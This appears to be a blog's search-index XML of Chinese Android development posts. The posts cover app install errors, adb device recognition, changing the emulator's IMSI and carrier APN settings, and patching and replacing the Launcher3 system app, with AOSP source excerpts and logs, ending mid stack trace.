<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>解决INSTALL_FAILED_INSUFFICIENT_STORAGE错误</title>
    <url>/2017/01/07/INSTALL-FAILED-INSUFFICIENT-STORAGE/</url>
    <content><![CDATA[<p>&emsp;&emsp;今天在一部手机上安装应用会一直返回INSTALL_FAILED_INSUFFICIENT_STORAGE错误，但是用df命令看手机储存空间又是足够的，一直想不通为什么。<br>&emsp;&emsp;隐隐觉得双清一下手机是可以解决问题，但是这样没法找到报错的根源。\n然后试了其他一些应用，发现都是能装上的，怀疑就和这个应用有关。<br>&emsp;&emsp;使用logcat查看安装过程中的日志，发现有这样一条  </p>
<blockquote>
<p>E/PackageManager(994): Cannot rename native library directory /data/app-lib/vmdl786013163 to /data/app-lib/com.tencent.mobileqq-1  </p>
</blockquote>
<p>&emsp;&emsp;顿时觉得问题出在这个目录上面，删除了这个目录之后，果然应用能够正常安装了</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>install</tag>
      </tags>
  </entry>
  <entry>
    <title>让adb识别到不能识别的设备</title>
    <url>/2017/01/07/adb-new-device/</url>
    <content><![CDATA[<p>有些设备tadb等第三方adb工具能识别，但是sdk中提供的adb却不能识别。这种情况可以通过修改<code>adb_usb.ini</code>来让adb识别。<br>该文件位于<code>C:\Users\{username}\.android\adb_usb.ini</code></p>
<p>将要识别设备的<code>VID</code>添加到adb_usb.ini文件，每行一个，如：</p>
<pre><code>0x2717  
0x2A45  
0x9BB5
</code></pre><h3 id="获取设备UID的方法"><a href="#获取设备UID的方法" class="headerlink" title="获取设备UID的方法"></a>获取设备UID的方法</h3><ul>
<li><p>打开设备管理器,找到安装的android硬件,右单属性再打开详细信息选项卡,在<code>属性</code>中选择<code>硬件id</code>,会在<code>值显示框</code>中出现硬件的id信息,只需要记下<code>VID_</code>后面跟的数字就行,比如我的是<code>USBUID_2207&amp;....</code>，只需要<code>2007</code>就行</p>
</li>
<li><p>使用<code>libusb-win32</code>查看  </p>
</li>
</ul>
<pre><code>\\.\libusb0-0001--0x2a45-0x0c03     2A45/0C03  
Dev #1: Meizu - MX4- Serial Number: 750BBKT22W4L  
</code></pre><p>如果不能看到这个设备，说明驱动没有正常安装</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>adb</tag>
      </tags>
  </entry>
  <entry>
    <title>解决Android模拟器中修改IMSI后无法上网问题</title>
    <url>/2018/01/25/android-emulator-modify-imsi-no-network/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>百度百科中对IMSI的介绍如下：</p>
<blockquote>
<p>国际移动用户识别码（IMSI：International Mobile Subscriber Identification Number）是区别移动用户的标志，储存在SIM卡中，可用于区别移动用户的有效信息。其总长度不超过15位，同样使用0~9的数字。其中MCC是移动用户所属国家代号，占3位数字，中国的MCC规定为460；MNC是移动网号码，由两位或者三位数字组成，中国移动的移动网络编码（MNC）为00；用于识别移动用户所归属的移动通信网；MSIN是移动用户识别码，用以识别某一移动通信网中的移动用户。</p>
</blockquote>
<p>通过IMSI可以知道移动用户所在的国家。在Android中可以通过以下方法获取设备的IMSI号：</p>
<pre><code>TelephonyManager telephonyManager= (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
String android_imsi = telephonyManager.getSubscriberId();
</code></pre><p>Android模拟器中默认使用的IMSI是：<code>310260000000000</code>。其中，310代表美国，260代表T-Mobile US。事实上，我们期望在模拟器上获取的IMSI应当以460开头（460代表中国）。</p>
<h2 id="0x01-问题定位"><a href="#0x01-问题定位" class="headerlink" title="0x01 问题定位"></a>0x01 问题定位</h2><p>但是，这串数字是硬编码在模拟器中的，路径是<code>external/qemu/android/telephony/modem.c</code>，只能通过修改模拟器源码来实现。</p>
<pre><code>#define  OPERATOR_HOME_MCC   310
#define  OPERATOR_HOME_MNC   260
#define  OPERATOR_HOME_MCCMNC  STRINGIFY(OPERATOR_HOME_MCC) \
                               STRINGIFY(OPERATOR_HOME_MNC)
{ &quot;+CIMI&quot;, OPERATOR_HOME_MCCMNC &quot;0000000000&quot;, NULL },   /* request internation subscriber identification number */
</code></pre><p>将以上代码改为：</p>
<pre><code>#define  OPERATOR_HOME_MCC   460 //中国
#define  OPERATOR_HOME_MNC   00  //移动
#define  OPERATOR_HOME_MCCMNC  STRINGIFY(OPERATOR_HOME_MCC) \
                               STRINGIFY(OPERATOR_HOME_MNC)
{ &quot;+CIMI&quot;, OPERATOR_HOME_MCCMNC &quot;00000000000&quot;, NULL }
</code></pre><p>重新编译，运行，使用getSubscriberId获取的值的确变成了我们期望的值：<code>460000000000000</code><br>，但是出现了新的问题：模拟器不能上网了。一番Google之后，发现也有别人遇到了这个<a href="http://stackoverflow.com/questions/6212626/changing-android-emulators-imsi-number-results-with-networks-connection" target="_blank" rel="noopener">问题</a>，但是也没有找到好的解决方法。</p>
<p>于是，决定自己寻找原因，从TelephonyManager一路翻下去，最终到ril层，也没有看出问题出在哪儿。但是，直觉告诉我，问题应当出在APN上。</p>
<p>Android系统中APN的配置信息是在<code>/system/etc/apns-conf.xml</code>中。下面是模拟器中默认的APN配置。</p>
<pre><code>&lt;!-- use empty string to specify no proxy or port --&gt;
&lt;!-- This version must agree with that in apps/common/res/apns.xml --&gt;
&lt;apns version=&quot;8&quot;&gt;
    &lt;apn carrier=&quot;T-Mobile US&quot;
         mcc=&quot;310&quot;
         mnc=&quot;260&quot;
         apn=&quot;epc.tmobile.com&quot;
         user=&quot;none&quot;
         server=&quot;*&quot;
         password=&quot;none&quot;
         mmsc=&quot;http://mms.msg.eng.t-mobile.com/mms/wapenc&quot;
    /&gt;

    &lt;apn carrier=&quot;T-Mobile US 250&quot;
         mcc=&quot;310&quot;
         mnc=&quot;250&quot;
         apn=&quot;epc.tmobile.com&quot;
         user=&quot;none&quot;
         server=&quot;*&quot;
         password=&quot;none&quot;
         mmsc=&quot;http://mms.msg.eng.t-mobile.com/mms/wapenc&quot;
            /&gt;

    &lt;apn carrier=&quot;T-Mobile US 660&quot;
         mcc=&quot;310&quot;
         mnc=&quot;660&quot;
         apn=&quot;epc.tmobile.com&quot;
         user=&quot;none&quot;
         server=&quot;*&quot;
         password=&quot;none&quot;
         mmsc=&quot;http://mms.msg.eng.t-mobile.com/mms/wapenc&quot;
            /&gt;

    &lt;apn carrier=&quot;T-Mobile US 230&quot;
         mcc=&quot;310&quot;
         mnc=&quot;230&quot;
         apn=&quot;epc.tmobile.com&quot;
         user=&quot;none&quot;
         server=&quot;*&quot;
         password=&quot;none&quot;
         mmsc=&quot;http://mms.msg.eng.t-mobile.com/mms/wapenc&quot;
            /&gt;

    &lt;apn carrier=&quot;T-Mobile US 310&quot;
         mcc=&quot;310&quot;
         mnc=&quot;310&quot;
         apn=&quot;epc.tmobile.com&quot;
         user=&quot;none&quot;
         server=&quot;*&quot;
         password=&quot;none&quot;
         mmsc=&quot;http://mms.msg.eng.t-mobile.com/mms/wapenc&quot;
            /&gt;

    &lt;apn carrier=&quot;T-Mobile US 580&quot;
         mcc=&quot;310&quot;
         mnc=&quot;580&quot;
         apn=&quot;epc.tmobile.com&quot;
         user=&quot;none&quot;
         server=&quot;*&quot;
         password=&quot;none&quot;
         mmsc=&quot;http://mms.msg.eng.t-mobile.com/mms/wapenc&quot;
            /&gt;

    &lt;apn carrier=&quot;T-Mobile US 240&quot;
         mcc=&quot;310&quot;
         mnc=&quot;240&quot;
         apn=&quot;epc.tmobile.com&quot;
         user=&quot;none&quot;
         server=&quot;*&quot;
         password=&quot;none&quot;
         mmsc=&quot;http://mms.msg.eng.t-mobile.com/mms/wapenc&quot;
            /&gt;

    &lt;apn carrier=&quot;T-Mobile US 800&quot;
         mcc=&quot;310&quot;
         mnc=&quot;800&quot;
         apn=&quot;epc.tmobile.com&quot;
         user=&quot;none&quot;
         server=&quot;*&quot;
         password=&quot;none&quot;
         mmsc=&quot;http://mms.msg.eng.t-mobile.com/mms/wapenc&quot;
            /&gt;

    &lt;apn carrier=&quot;T-Mobile US 210&quot;
         mcc=&quot;310&quot;
         mnc=&quot;210&quot;
         apn=&quot;epc.tmobile.com&quot;
         user=&quot;none&quot;
         server=&quot;*&quot;
         password=&quot;none&quot;
         mmsc=&quot;http://mms.msg.eng.t-mobile.com/mms/wapenc&quot;
            /&gt;

    &lt;apn carrier=&quot;T-Mobile US 160&quot;
         mcc=&quot;310&quot;
         mnc=&quot;160&quot;
         apn=&quot;epc.tmobile.com&quot;
         user=&quot;none&quot;
         server=&quot;*&quot;
         password=&quot;none&quot;
         mmsc=&quot;http://mms.msg.eng.t-mobile.com/mms/wapenc&quot;
            /&gt;

    &lt;apn carrier=&quot;T-Mobile US 270&quot;
         mcc=&quot;310&quot;
         mnc=&quot;270&quot;
         apn=&quot;epc.tmobile.com&quot;
         user=&quot;none&quot;
         server=&quot;*&quot;
         password=&quot;none&quot;
         mmsc=&quot;http://mms.msg.eng.t-mobile.com/mms/wapenc&quot;
            /&gt;

    &lt;apn carrier=&quot;T-Mobile US 200&quot;
         mcc=&quot;310&quot;
         mnc=&quot;200&quot;
         apn=&quot;epc.tmobile.com&quot;
         user=&quot;none&quot;
         server=&quot;*&quot;
         password=&quot;none&quot;
         mmsc=&quot;http://mms.msg.eng.t-mobile.com/mms/wapenc&quot;
            /&gt;

    &lt;apn carrier=&quot;T-Mobile US 220&quot;
         mcc=&quot;310&quot;
         mnc=&quot;220&quot;
         apn=&quot;epc.tmobile.com&quot;
         user=&quot;none&quot;
         server=&quot;*&quot;
         password=&quot;none&quot;
         mmsc=&quot;http://mms.msg.eng.t-mobile.com/mms/wapenc&quot;
            /&gt;

    &lt;apn carrier=&quot;T-Mobile US 490&quot;
         mcc=&quot;310&quot;
         mnc=&quot;490&quot;
         apn=&quot;epc.tmobile.com&quot;
         user=&quot;none&quot;
         server=&quot;*&quot;
         password=&quot;none&quot;
         mmsc=&quot;http://mms.msg.eng.t-mobile.com/mms/wapenc&quot;
            /&gt;

    &lt;!-- T-Mobile Europe --&gt;
    &lt;apn carrier=&quot;T-Mobile UK&quot;
         mcc=&quot;234&quot;
         mnc=&quot;30&quot;
         apn=&quot;general.t-mobile.uk&quot;
         user=&quot;t-mobile&quot;
         password=&quot;tm&quot;
         server=&quot;*&quot;
         mmsproxy=&quot;149.254.201.135&quot;
         mmsport=&quot;8080&quot;
         mmsc=&quot;http://mmsc.t-mobile.co.uk:8002&quot;
    /&gt;

    &lt;apn carrier=&quot;T-Mobile D&quot;
         mcc=&quot;262&quot;
         mnc=&quot;01&quot;
         apn=&quot;internet.t-mobile&quot;
         user=&quot;t-mobile&quot;
         password=&quot;tm&quot;
         server=&quot;*&quot;
         mmsproxy=&quot;172.028.023.131&quot;
         mmsport=&quot;8008&quot;
         mmsc=&quot;http://mms.t-mobile.de/servlets/mms&quot;
    /&gt;

    &lt;apn carrier=&quot;T-Mobile A&quot;
         mcc=&quot;232&quot;
         mnc=&quot;03&quot;
         apn=&quot;gprsinternet&quot;
         user=&quot;t-mobile&quot;
         password=&quot;tm&quot;
         server=&quot;*&quot;
         mmsproxy=&quot;010.012.000.020&quot;
         mmsport=&quot;80&quot;
         mmsc=&quot;http://mmsc.t-mobile.at/servlets/mms&quot;
         type=&quot;default,supl&quot;
    /&gt;

    &lt;apn carrier=&quot;T-Mobile A MMS&quot;
         mcc=&quot;232&quot;
         mnc=&quot;03&quot;
         apn=&quot;gprsmms&quot;
         user=&quot;t-mobile&quot;
         password=&quot;tm&quot;
         server=&quot;*&quot;
         mmsproxy=&quot;010.012.000.020&quot;
         mmsport=&quot;80&quot;
         mmsc=&quot;http://mmsc.t-mobile.at/servlets/mms&quot;
         type=&quot;mms&quot;
    /&gt;

    &lt;apn carrier=&quot;T-Mobile CZ&quot;
         mcc=&quot;230&quot;
         mnc=&quot;01&quot;
         apn=&quot;internet.t-mobile.cz&quot;
         user=&quot;wap&quot;
         password=&quot;wap&quot;
         server=&quot;*&quot;
         mmsproxy=&quot;010.000.000.010&quot;
         mmsport=&quot;80&quot;
         mmsc=&quot;http://mms&quot;
         type=&quot;default,supl&quot;
    /&gt;

    &lt;apn carrier=&quot;T-Mobile CZ MMS&quot;
         mcc=&quot;230&quot;
         mnc=&quot;01&quot;
         apn=&quot;mms.t-mobile.cz&quot;
         user=&quot;mms&quot;
         password=&quot;mms&quot;
         server=&quot;*&quot;
         mmsproxy=&quot;010.000.000.010&quot;
         mmsport=&quot;80&quot;
         mmsc=&quot;http://mms&quot;
         type=&quot;mms&quot;
    /&gt;

    &lt;apn carrier=&quot;T-Mobile NL&quot;
         mcc=&quot;204&quot;
         mnc=&quot;16&quot;
         apn=&quot;internet&quot;
         user=&quot;*&quot;
         password=&quot;*&quot;
         server=&quot;*&quot;
         mmsproxy=&quot;010.010.010.011&quot;
         mmsport=&quot;8080&quot;
         mmsc=&quot;http://t-mobilemms&quot;
         type=&quot;default,supl&quot;
    /&gt;

    &lt;apn carrier=&quot;T-Mobile NL MMS&quot;
         mcc=&quot;204&quot;
         mnc=&quot;16&quot;
         apn=&quot;mms&quot;
         user=&quot;tmobilemms&quot;
         password=&quot;tmobilemms&quot;
         server=&quot;*&quot;
         mmsproxy=&quot;010.010.010.011&quot;
         mmsport=&quot;8080&quot;
         mmsc=&quot;http://t-mobilemms&quot;
         type=&quot;mms&quot;
    /&gt;
&lt;/apns&gt;
</code></pre><p>可以看出，这里是没有国内运营商的配置的。我从小米手机中提取出的国内运营商配置。</p>
<pre><code>&lt;apn carrier=&quot;中国移动 (China Mobile) GPRS&quot;
    mcc=&quot;460&quot;
    mnc=&quot;00&quot;
    apn=&quot;cmnet&quot;
    type=&quot;default,supl&quot;
/&gt;

&lt;apn carrier=&quot;中国移动 (China Mobile) WAP&quot;
    mcc=&quot;460&quot;
    mnc=&quot;00&quot;
    apn=&quot;cmwap&quot;
    port=&quot;80&quot;
    proxy=&quot;10.0.0.172&quot;
    type=&quot;default,supl&quot;
/&gt;

&lt;apn carrier=&quot;中国移动彩信 (China Mobile)&quot;
    mcc=&quot;460&quot;
    mnc=&quot;00&quot;
    apn=&quot;cmwap&quot;
    mmsc=&quot;http://mmsc.monternet.com&quot;
    mmsport=&quot;80&quot;
    mmsproxy=&quot;10.0.0.172&quot;
    port=&quot;80&quot;
    proxy=&quot;10.0.0.172&quot;
    type=&quot;mms&quot;
/&gt;

&lt;apn carrier=&quot;沃3G连接互联网 (China Unicom)&quot;
    mcc=&quot;460&quot;
    mnc=&quot;01&quot;
    apn=&quot;3gnet&quot;
    type=&quot;default,supl&quot;
/&gt;

&lt;apn carrier=&quot;沃3G手机上网 (China Unicom)&quot;
    mcc=&quot;460&quot;
    mnc=&quot;01&quot;
    apn=&quot;3gwap&quot;
    port=&quot;80&quot;
    proxy=&quot;10.0.0.172&quot;
    type=&quot;default,supl&quot;
/&gt;

&lt;apn carrier=&quot;联通彩信 (China Unicom)&quot;
    mcc=&quot;460&quot;
    mnc=&quot;01&quot;
    apn=&quot;3gwap&quot;
    mmsc=&quot;http://mmsc.myuni.com.cn&quot;
    mmsport=&quot;80&quot;
    mmsproxy=&quot;10.0.0.172&quot;
    type=&quot;mms&quot;
/&gt;

&lt;apn carrier=&quot;中国移动 (China Mobile) GPRS&quot;
    mcc=&quot;460&quot;
    mnc=&quot;02&quot;
    apn=&quot;cmnet&quot;
    type=&quot;default,supl&quot;
/&gt;

&lt;apn carrier=&quot;中国移动 (China Mobile) WAP&quot;
    mcc=&quot;460&quot;
    mnc=&quot;02&quot;
    apn=&quot;cmwap&quot;
    port=&quot;80&quot;
    proxy=&quot;10.0.0.172&quot;
    type=&quot;default,supl&quot;
/&gt;

&lt;apn carrier=&quot;中国移动彩信 (China Mobile)&quot;
    mcc=&quot;460&quot;
    mnc=&quot;02&quot;
    apn=&quot;cmwap&quot;
    mmsc=&quot;http://mmsc.monternet.com&quot;
    mmsport=&quot;80&quot;
    mmsproxy=&quot;10.0.0.172&quot;
    port=&quot;80&quot;
    proxy=&quot;10.0.0.172&quot;
    type=&quot;mms&quot;
/&gt;
</code></pre><p>添加到apns-conf.xml中，重启模拟器，能识别出“中国移动”了，但依然不能上网。<br><img src="/images/apn.png" alt></p>
<p>此时，我想到通过对比默认情况和修改后的radio日志，来分析原因。</p>
<p>使用</p>
<blockquote>
<p>adb logcat -b radio</p>
</blockquote>
<p>命令可以查查看ril相关的日志。接着，就发现了如下两条日志：</p>
<blockquote>
<p>D/DCT     ( 1739): [0]createAllApnList: selection=numeric = ‘460000’<br>D/DCT     ( 1739): [0]createAllApnList: No APN found for carrier: 460000</p>
</blockquote>
<p>注意到这里的<code>460000</code>，正确的应该是<code>46000</code>，多了一个<code>0</code>。由于美国的MNC是3个字符，而中国的MNC是2个字符，所以导致这里多了一个字符。来看下源码在这里是怎么实现的。</p>
<p><code>/frameworks/opt/telephony/src/java/com/android/internal/telephony/dataconnection/DcTracker.java</code></p>
<pre><code>/**
 * Based on the sim operator numeric, create a list for all possible
 * Data Connections and setup the preferredApn.
 */
private void createAllApnList() {
    mAllApnSettings = new ArrayList&lt;ApnSetting&gt;();
    IccRecords r = mIccRecords.get();
    String operator = (r != null) ? r.getOperatorNumeric() : &quot;&quot;;
    if (operator != null) {
        String selection = &quot;numeric = &#39;&quot; + operator + &quot;&#39;&quot;;
        // query only enabled apn.
        // carrier_enabled : 1 means enabled apn, 0 disabled apn.
        // selection += &quot; and carrier_enabled = 1&quot;;
        if (DBG) log(&quot;createAllApnList: selection=&quot; + selection);

        Cursor cursor = mPhone.getContext().getContentResolver().query(
                Telephony.Carriers.CONTENT_URI, null, selection, null, null);

        if (cursor != null) {
            if (cursor.getCount() &gt; 0) {
                mAllApnSettings = createApnList(cursor);
            }
            cursor.close();
        }
    }

    addEmergencyApnSetting();

    dedupeApnSettings();

    if (mAllApnSettings.isEmpty()) {
        if (DBG) log(&quot;createAllApnList: No APN found for carrier: &quot; + operator);
        mPreferredApn = null;
        // TODO: What is the right behavior?
        //notifyNoData(DataConnection.FailCause.MISSING_UNKNOWN_APN);
    } else {
        mPreferredApn = getPreferredApn();
        if (mPreferredApn != null &amp;&amp; !mPreferredApn.numeric.equals(operator)) {
            mPreferredApn = null;
            setPreferredApn(-1);
        }
        if (DBG) log(&quot;createAllApnList: mPreferredApn=&quot; + mPreferredApn);
    }
    if (DBG) log(&quot;createAllApnList: X mAllApnSettings=&quot; + mAllApnSettings);

    setDataProfilesAsNeeded();
}
</code></pre><p>getOperatorNumeric的实现是在<code>/frameworks/opt/telephony/src/java/com/android/internal/telephony/uicc/SIMRecords.java</code>中。</p>
<pre><code>@Override
public String getOperatorNumeric() {
    if (mImsi == null) {
        log(&quot;getOperatorNumeric: IMSI == null&quot;);
        return null;
    }
    if (mMncLength == UNINITIALIZED || mMncLength == UNKNOWN) {
        log(&quot;getSIMOperatorNumeric: bad mncLength&quot;);
        return null;
    }

    // Length = length of MCC + length of MNC
    // length of mcc = 3 (TS 23.003 Section 2.2)
    return mImsi.substring(0, 3 + mMncLength);
}
</code></pre><p>可见，numeric的长度是受mMncLength控制的，而mMncLength的值是从SIM卡中读出来的。</p>
<pre><code>case EVENT_GET_AD_DONE:
    try {
        isRecordLoadResponse = true;

        ar = (AsyncResult)msg.obj;
        data = (byte[])ar.result;

        if (ar.exception != null) {
            break;
        }

        log(&quot;EF_AD: &quot; + IccUtils.bytesToHexString(data));

        if (data.length &lt; 3) {
            log(&quot;Corrupt AD data on SIM&quot;);
            break;
        }

        if (data.length == 3) {
            log(&quot;MNC length not present in EF_AD&quot;);
            break;
        }

        mMncLength = data[3] &amp; 0xf;
        log(&quot;setting4 mMncLength=&quot; + mMncLength);

        if (mMncLength == 0xf) {
            mMncLength = UNKNOWN;
            log(&quot;setting5 mMncLength=&quot; + mMncLength);
        }
    }
</code></pre><p>最终定位到模拟器中的<code>external/qemu/android/telephony/sim_card.c</code>中。</p>
<pre><code>    { &quot;+CRSM=192,28589,0,0,15&quot;, &quot;+CRSM: 144,0,000000046fad04000aa0aa01020000&quot; },
    { &quot;+CRSM=176,28589,0,0,4&quot;,  &quot;+CRSM: 144,0,00000003&quot; },
</code></pre><p>将<code>00000003</code>改成<code>00000002</code>，重新编译，运行，终于可以正常上网了。</p>
<h2 id="0x02-解决更新问题"><a href="#0x02-解决更新问题" class="headerlink" title="0x02 解决更新问题"></a>0x02 解决更新问题</h2><p>此时，对于新创建的模拟器已经正常了，但是对于存量模拟器，由于telephony.db数据库中的carriers表中的数据没有更新，因此重启后还是不能上网。</p>
<p>查看carriers表中的内容可以在adb shell中执行命令：<br><code>content query --uri content://telephony/carriers</code></p>
<p><code>/packages/providers/TelephonyProvider/src/com/android/providers/telephony/TelephonyProvider.java</code></p>
<pre><code>@Override
public void onCreate(SQLiteDatabase db) {
    if (DBG) log(&quot;dbh.onCreate:+ db=&quot; + db);
    createSimInfoTable(db);
    createCarriersTable(db);
    initDatabase(db);
    if (DBG) log(&quot;dbh.onCreate:- db=&quot; + db);
}

private void initDatabase(SQLiteDatabase db) {
    if (VDBG) log(&quot;dbh.initDatabase:+ db=&quot; + db);
    // Read internal APNS data
    Resources r = mContext.getResources();
    XmlResourceParser parser = r.getXml(com.android.internal.R.xml.apns);
    int publicversion = -1;
    try {
        XmlUtils.beginDocument(parser, &quot;apns&quot;);
        publicversion = Integer.parseInt(parser.getAttributeValue(null, &quot;version&quot;));
        loadApns(db, parser);
    } catch (Exception e) {
        loge(&quot;Got exception while loading APN database.&quot; + e);
    } finally {
        parser.close();
    }

    // Read external APNS data (partner-provided)
    XmlPullParser confparser = null;
    // Environment.getRootDirectory() is a fancy way of saying ANDROID_ROOT or &quot;/system&quot;.
    File confFile = new File(Environment.getRootDirectory(), PARTNER_APNS_PATH);
    File oemConfFile =  new File(Environment.getOemDirectory(), OEM_APNS_PATH);
    if (oemConfFile.exists()) {
        // OEM image exist APN xml, get the timestamp from OEM &amp; System image for comparison
        long oemApnTime = oemConfFile.lastModified();
        long sysApnTime = confFile.lastModified();
        if (DBG) log(&quot;APNs Timestamp: oemTime = &quot; + oemApnTime + &quot; sysTime = &quot;
                + sysApnTime);

        // To get the latest version from OEM or System image
        if (oemApnTime &gt; sysApnTime) {
            if (DBG) log(&quot;APNs Timestamp: OEM image is greater than System image&quot;);
            confFile = oemConfFile;
        }
    } else {
        // No Apn in OEM image, so load it from system image.
        if (DBG) log(&quot;No APNs in OEM image = &quot; + oemConfFile.getPath() +
                &quot; Load APNs from system image&quot;);
    }

    FileReader confreader = null;
    if (DBG) log(&quot;confFile = &quot; + confFile);
    try {
        confreader = new FileReader(confFile);
        confparser = Xml.newPullParser();
        confparser.setInput(confreader);
        XmlUtils.beginDocument(confparser, &quot;apns&quot;);

        // Sanity check. Force internal version and confidential versions to agree
        int confversion = Integer.parseInt(confparser.getAttributeValue(null, &quot;version&quot;));
        if (publicversion != confversion) {
            throw new IllegalStateException(&quot;Internal APNS file version doesn&#39;t match &quot;
                    + confFile.getAbsolutePath());
        }

        loadApns(db, confparser);
    } catch (FileNotFoundException e) {
        // It&#39;s ok if the file isn&#39;t found. It means there isn&#39;t a confidential file
        // Log.e(TAG, &quot;File not found: &#39;&quot; + confFile.getAbsolutePath() + &quot;&#39;&quot;);
    } catch (Exception e) {
        loge(&quot;Exception while parsing &#39;&quot; + confFile.getAbsolutePath() + &quot;&#39;&quot; + e);
    } finally {
        try { if (confreader != null) confreader.close(); } catch (IOException e) { }
    }
    if (VDBG) log(&quot;dbh.initDatabase:- db=&quot; + db);

}

private DatabaseHelper mOpenHelper;

private void restoreDefaultAPN(int subId) {
    SQLiteDatabase db = mOpenHelper.getWritableDatabase();

    try {
        db.delete(CARRIERS_TABLE, null, null);
    } catch (SQLException e) {
        loge(&quot;got exception when deleting to restore: &quot; + e);
    }
    setPreferredApnId((long)-1, subId);
    mOpenHelper.initDatabase(db);
}
</code></pre><p>可以看出，在restoreDefaultAPN的时候可以重新初始化CARRIERS_TABLE。也就说，只要进入APN界面，点击右上角菜单 =&gt; 重置为默认设置，就可以解决存量设备的上网问题了。</p>
<h2 id="0x03-解决方法总结"><a href="#0x03-解决方法总结" class="headerlink" title="0x03 解决方法总结"></a>0x03 解决方法总结</h2><ol>
<li>修改模拟器源码modem.c中的MCC和MNC</li>
<li>修改模拟器源码sim_card.c中控制mMncLength的值</li>
<li>修改Android镜像中的/system/etc/apns-conf.xml，添加国内运营商的配置信息</li>
<li>存量设备更新APN</li>
</ol>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>emulator</tag>
      </tags>
  </entry>
  <entry>
    <title>Android模拟器中替换系统应用的方法</title>
    <url>/2017/04/27/android-emulator-replace-system-app/</url>
    <content><![CDATA[<p>Android模拟器6.0版本进入系统时，桌面应用com.android.launcher3会发生随机Crash。</p>
<blockquote>
<p>W/System.err( 1611): java.lang.IllegalArgumentException:<br>Wrong state class, expecting View State but received class<br>android.appwidget.AppWidgetHostView$ParcelableSparseArray instead.<br>This usually happens when two views of different type have the same id in the same hierarchy.<br>This view’s id is id/0x3. Make sure other views do not use the same id.</p>
</blockquote>
<blockquote>
<p>W/System.err( 1611):     at android.view.View.onRestoreInstanceState(View.java:13772)<br>W/System.err( 1611):     at android.widget.TextView.onRestoreInstanceState(TextView.java:3784)<br>W/System.err( 1611):     at android.view.View.dispatchRestoreInstanceState(View.java:13748)<br>W/System.err( 1611):     at android.view.ViewGroup.dispatchRestoreInstanceState(ViewGroup.java:2894)<br>W/System.err( 1611):     at android.view.ViewGroup.dispatchRestoreInstanceState(ViewGroup.java:2894)<br>W/System.err( 1611):     at android.view.ViewGroup.dispatchRestoreInstanceState(ViewGroup.java:2894)<br>W/System.err( 1611):     at android.view.ViewGroup.dispatchRestoreInstanceState(ViewGroup.java:2894)<br>W/System.err( 1611):     at android.view.ViewGroup.dispatchRestoreInstanceState(ViewGroup.java:2894)<br>W/System.err( 1611):     at android.view.ViewGroup.dispatchRestoreInstanceState(ViewGroup.java:2894)<br>W/System.err( 1611):     at android.view.View.restoreHierarchyState(View.java:13726)<br>W/System.err( 1611):     at com.android.internal.policy.impl.PhoneWindow.restoreHierarchyState(PhoneWindow.java:2009)<br>W/System.err( 1611):     at android.app.Activity.onRestoreInstanceState(Activity.java:1074)<br>W/System.err( 1611):     at com.android.launcher3.Launcher.onRestoreInstanceState(Launcher.java:2013)</p>
</blockquote>
<p>在<a href="https://github.com/northbright/Notes/blob/master/Android/Launcher/launcher3_runtime_exception_two_views_of_different_type_have_the_same_id.md" target="_blank" rel="noopener">网上</a>找到如下解决方法：</p>
<p>packages/apps/Launcher3/src/com/android/launcher3/Launcher.java:</p>
<pre><code>public void onRestoreInstanceState(Bundle state) {
    // Wrap the code block will throw runtinme exception in try / catch block
    // ----------------------------------------------------------------------
    //super.onRestoreInstanceState(state);
    //for (int page: mSynchronouslyBoundPages) {
    //    mWorkspace.restoreInstanceStateForChild(page);
    //}

    try {
        super.onRestoreInstanceState(state);
        for (int page: mSynchronouslyBoundPages) {
            mWorkspace.restoreInstanceStateForChild(page);
        }
    } catch (Exception e) {
        Log.e(TAG, &quot;Exception in onRestoreInstanceState():&quot;);
        e.printStackTrace();
    }
}
</code></pre><p>编译后替换掉镜像中的文件：</p>
<blockquote>
<p>/system/priv-app/Launcher3/Launcher3.apk<br>/system/priv-app/Launcher3/oat/x86/Launcher3.odex</p>
</blockquote>
<p>重启后报了另外一个错误：</p>
<blockquote>
<p>java.lang.RuntimeException: Unable to get provider com.android.launcher3.LauncherProvider: java.lang.ClassNotFoundException: Didn’t find class “com.android.launcher3.LauncherProvider” on path: DexPathList[[zip file “/system/priv-app/Launcher3/Launcher3.apk”],nativeLibraryDirectories=[/system/priv-app/Launcher3/lib/x86, /vendor/lib, /system/lib]]<br>at android.app.ActivityThread.installProvider(ActivityThread.java:5156)<br>at android.app.ActivityThread.installContentProviders(ActivityThread.java:4748)<br>at android.app.ActivityThread.handleBindApplication(ActivityThread.java:4688)<br>at android.app.ActivityThread.-wrap1(ActivityThread.java)<br>at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1405)<br>at android.os.Handler.dispatchMessage(Handler.java:102)<br>at android.os.Looper.loop(Looper.java:148)<br>at android.app.ActivityThread.main(ActivityThread.java:5417)<br>at java.lang.reflect.Method.invoke(Native Method)<br>at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:726)<br>at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:616)<br>Caused by: java.lang.ClassNotFoundException: Didn’t find class “com.android.launcher3.LauncherProvider” on path: DexPathList[[zip file “/system/priv-app/Launcher3/Launcher3.apk”],nativeLibraryDirectories=[/system/priv-app/Launcher3/lib/x86, /vendor/lib, /system/lib]]<br>at dalvik.system.BaseDexClassLoader.findClass(BaseDexClassLoader.java:56)<br>at java.lang.ClassLoader.loadClass(ClassLoader.java:511)<br>at java.lang.ClassLoader.loadClass(ClassLoader.java:469)<br>at android.app.ActivityThread.installProvider(ActivityThread.java:5141)<br>… 10 more<br>Suppressed: java.io.IOException: No original dex files found for dex location /system/priv-app/Launcher3/Launcher3.apk<br>at dalvik.system.DexFile.openDexFileNative(Native Method)<br>at dalvik.system.DexFile.openDexFile(DexFile.java:295)<br>at dalvik.system.DexFile.<init>(DexFile.java:80)<br>at dalvik.system.DexFile.<init>(DexFile.java:59)<br>at dalvik.system.DexPathList.loadDexFile(DexPathList.java:279)<br>at dalvik.system.DexPathList.makePathElements(DexPathList.java:248)<br>at dalvik.system.DexPathList.<init>(DexPathList.java:120)<br>at dalvik.system.BaseDexClassLoader.<init>(BaseDexClassLoader.java:48)<br>at 